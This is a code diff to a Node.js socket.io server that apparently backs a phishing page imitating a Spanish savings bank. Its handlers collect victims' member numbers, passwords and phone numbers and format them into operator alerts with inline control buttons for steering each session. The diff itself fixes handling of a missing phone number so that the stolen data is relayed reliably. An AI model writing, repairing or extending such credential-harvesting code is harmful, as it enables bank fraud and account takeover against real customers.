@@ -26,10 +26,15 @@ app.use(bodyParser.json());
 
 io.on('connection', (socket) => {
   // Login principal (campo socio)
-  socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
+  socket.on('dataForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}📱 Número telefónico: ${telefono}`;
+    // Verifica si telefono es undefined
+    if (!telefono) {
+      console.error("Error: El número de teléfono no se ha recibido.");
+    }
+
+    const mensaje = `🔐 Nuevo intento de acceso CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Contraseña: ${contrasena}\n📱 Número telefónico: ${telefono || 'No proporcionado'}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -89,7 +94,7 @@ io.on('connection', (socket) => {
   socket.on('errorlogoForm', ({ socio, contrasena, telefono, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}\n📱 Número telefónico: ${telefono}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}\n📱 Número telefónico: ${telefono || 'No proporcionado'}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
